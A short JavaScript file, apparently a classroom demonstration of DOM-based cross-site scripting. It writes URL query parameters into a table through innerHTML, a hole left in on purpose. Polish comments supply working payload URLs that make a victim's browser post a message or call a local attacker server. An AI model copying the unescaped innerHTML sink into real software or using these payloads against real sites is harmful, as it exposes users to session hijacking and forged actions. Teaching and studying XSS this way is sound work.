const getAllQueryParams = () => {
    const params = new URLSearchParams(document.location.search);
    const paramObj = {};
    for(let value of params.keys()) {
        paramObj[value] = params.get(value);
    }

    return paramObj;
}

const displayQueryParams = () => {
    const queryParamsTable = document.querySelector('#queryParamsTable');
    const queryParamsObj = getAllQueryParams();

    if (queryParamsTable == null) return;

    for (let key in queryParamsObj) {
        if (key === 'q') continue;

        const name = key;
        const value = queryParamsObj[key];

        const tr = document.createElement('tr');
        const nameTd = document.createElement('td');
        const valueTd = document.createElement('td');

        nameTd.innerHTML = name; // do not use innerHTML
        valueTd.innerHTML = value; // do not use innerHTML

        console.log(name, value)

        tr.appendChild(nameTd);
        tr.appendChild(valueTd);

        queryParamsTable.appendChild(tr);
    }
};

displayQueryParams();

// wysyłanie wiadomości przez hackera z przeglądarki ofiary
// http://127.0.0.1/?q=123&hacked=<img src="/images/xxxyyy" onerror="document.querySelector('textarea').value='I am a hacker!!!';document.querySelector('button').click()" >

// to jest ten sam link co wyżej ale już URL-encoded
// http://127.0.0.1/?q=123&hacked=%3Cimg%20src=%22/images/xxxyyy%22%20onerror=%22document.querySelector(%27textarea%27).value=%27I%20am%20a%20hacker!!!%27;document.querySelector(%27button%27).click()%22%20%3E

// GET request do serwera z przeglądarki ofiary
// http://127.0.0.1/?q=123&hacked=<img src="/images/xxxyyy" onerror="fetch('http://127.0.0.1:9000/')" >
